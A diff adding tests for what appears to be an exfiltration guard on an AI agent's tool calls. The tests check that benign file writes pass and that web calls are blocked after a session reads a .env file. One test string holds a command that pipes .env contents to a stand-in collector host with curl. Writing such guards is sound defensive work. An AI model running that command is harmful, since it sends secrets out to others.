@@ -305,3 +305,32 @@ def test_audit_mode_does_not_reserve_pending_state():
     pre = ctx.hooks["pre_tool_call"]
     assert pre(tool_name="read_file", args={"path": "/etc/hosts"}, session_id="s") is None
     assert pre(tool_name="web_extract", args={"url": "https://example.com"}, session_id="s") is None
+
+
+def test_benign_doc_write_mentioning_secret_and_url_is_allowed():
+    ctx = FakeContext({"safe_read_roots": "/work"})
+    register(ctx)
+    doc = "Rotate keys: cat .env then curl https://collector.invalid -d @-"
+    assert (
+        ctx.hooks["pre_tool_call"](
+            tool_name="write_file",
+            args={"path": "/work/notes.md", "content": doc},
+            session_id="s",
+        )
+        is None
+    )
+
+
+def test_tainted_session_allows_local_reads_but_blocks_egress():
+    ctx = FakeContext({"safe_read_roots": "/work"})
+    register(ctx)
+    pre = ctx.hooks["pre_tool_call"]
+    ctx.hooks["post_tool_call"](
+        tool_name="read_file",
+        args={"path": "/work/.env"},
+        result='{"content":"not retained"}',
+        status="success",
+        session_id="s",
+    )
+    assert pre(tool_name="read_file", args={"path": "/work/other.txt"}, session_id="s") is None
+    assert pre(tool_name="web_search", args={"query": "x"}, session_id="s")["action"] == "block"
